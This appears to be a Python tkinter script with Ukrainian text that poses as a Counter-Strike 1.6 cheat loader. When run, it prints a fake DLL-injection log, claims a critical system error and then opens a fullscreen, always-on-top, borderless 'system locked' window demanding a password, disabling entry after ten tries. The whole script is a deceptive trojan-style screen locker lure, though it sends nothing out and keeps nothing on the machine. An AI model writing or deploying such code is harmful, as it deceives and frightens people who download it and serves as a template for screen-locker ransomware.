import tkinter as tk
import sys
import subprocess
import os
import random
import threading
import time

# ===== ФУНКЦІЯ ВІНЛОКЕРА =====
def winlocker():
    # Створюємо вікно локера
    lock = tk.Toplevel(root)
    lock.title("")
    lock.geometry(f"{lock.winfo_screenwidth()}x{lock.winfo_screenheight()}+0+0")
    lock.attributes('-topmost', True)
    lock.overrideredirect(True)
    lock.configure(bg='#0f0f0f')

    attempts = 0
    max_attempts = 10

    def check_password():
        nonlocal attempts
        attempts += 1
        remaining = max_attempts - attempts
        attempts_label.config(text=f"Спроби: {attempts}/{max_attempts}")

        if entry.get() == "1234":
            status_label.config(text="✅ ДОСТУП ДОЗВОЛЕНО", fg="green")
            lock.after(1500, lock.destroy)
        else:
            if remaining > 0:
                status_label.config(text=f"❌ Невірно! Залишилось: {remaining}", fg="red")
            else:
                status_label.config(text="💀 СИСТЕМУ ЗАБЛОКОВАНО", fg="red")
                entry.config(state="disabled")
                btn.config(state="disabled")
            entry.delete(0, tk.END)

    # Інтерфейс локера
    frame = tk.Frame(lock, bg='#1e1e1e', bd=2, relief='ridge')
    frame.place(relx=0.5, rely=0.5, anchor='center', width=500, height=350)

    tk.Label(frame, text="🔒 СИСТЕМУ ЗАБЛОКОВАНО",
             font=("Arial", 20, "bold"), bg="#1e1e1e", fg="#ff4444").pack(pady=(30, 10))

    tk.Label(frame, text="Введіть пароль для розблокування:",
             font=("Arial", 14), bg="#1e1e1e", fg="white").pack(pady=10)

    entry = tk.Entry(frame, show="*", font=("Arial", 16), width=15,
                     bg="#2d2d2d", fg="white", insertbackground="white", justify="center")
    entry.pack(pady=10)
    entry.focus()

    btn = tk.Button(frame, text="РОЗБЛОКУВАТИ", command=check_password,
                    font=("Arial", 14, "bold"), bg="#0078d7", fg="white",
                    activebackground="#005a9e", bd=0, padx=20, pady=5)
    btn.pack(pady=5)

    status_label = tk.Label(frame, text="", font=("Arial", 12),
                            bg="#1e1e1e", fg="white")
    status_label.pack(pady=5)

    attempts_label = tk.Label(frame, text=f"Спроби: 0/{max_attempts}",
                               font=("Arial", 10), bg="#1e1e1e", fg="#aaaaaa")
    attempts_label.pack()

    lock.bind('<Return>', lambda event: check_password())

# ===== ФУНКЦІЯ "АКТИВАЦІЇ ЧИТА" =====
def activate_cheat():
    activate_btn.config(state="disabled")
    status_label.config(text="🔄 Активація чита...", fg="yellow")
    log_text.insert(tk.END, "🔍 Пошук процесів CS 1.6...\n")
    log_text.see(tk.END)
    root.update()

    def fake_activation():
        time.sleep(2)
        log_text.insert(tk.END, "✅ Процес знайдено (hl.exe)\n")
        root.update()
        time.sleep(1)
        log_text.insert(tk.END, "⚙️ Інжекція DLL...\n")
        root.update()
        time.sleep(2)
        log_text.insert(tk.END, "❌ ПОМИЛКА! Не вдалося інжектувати!\n")
        root.update()
        time.sleep(1)
        log_text.insert(tk.END, "⚠️ Критична помилка системи!\n")
        root.update()
        status_label.config(text="⚠️ КРИТИЧНА ПОМИЛКА", fg="red")
        time.sleep(1)
        winlocker()

    threading.Thread(target=fake_activation).start()

# ===== ГОЛОВНЕ ВІКНО (ФЕЙК ЧИТ) =====
root = tk.Tk()
root.title("CS 1.6 Cheat Loader v3.7")
root.geometry("600x450")
root.resizable(False, False)
root.configure(bg="#1a1a1a")

# Заголовок
tk.Label(root, text="⚡ CS 1.6 CHEAT LOADER ⚡",
         font=("Arial", 20, "bold"), bg="#1a1a1a", fg="lime").pack(pady=10)

tk.Label(root, text="Професійний чит для Counter-Strike 1.6",
         font=("Arial", 10), bg="#1a1a1a", fg="gray").pack()

# Статус
status_label = tk.Label(root, text="✅ Очікування активації",
                        font=("Arial", 12), bg="#1a1a1a", fg="lime")
status_label.pack(pady=5)

# Лог
log_frame = tk.Frame(root, bg="#111")
log_frame.pack(pady=10, padx=20, fill='both', expand=True)
log_text = tk.Text(log_frame, height=10, width=70,
                   bg="#111", fg="#0f0", font=("Consolas", 10))
log_text.pack(side='left', fill='both', expand=True)

scroll = tk.Scrollbar(log_frame)
scroll.pack(side='right', fill='y')
log_text.config(yscrollcommand=scroll.set)
scroll.config(command=log_text.yview)

# Кнопка активації
activate_btn = tk.Button(root, text="🚀 АКТИВУВАТИ ЧИТ", command=activate_cheat,
                         font=("Arial", 16, "bold"), bg="#aa0000", fg="white",
                         padx=30, pady=10)
activate_btn.pack(pady=15)

# Примітка
tk.Label(root, text="*Працює тільки з CS 1.6 (Steam / NoSteam)",
         font=("Arial", 8), bg="#1a1a1a", fg="gray").pack()

root.mainloop()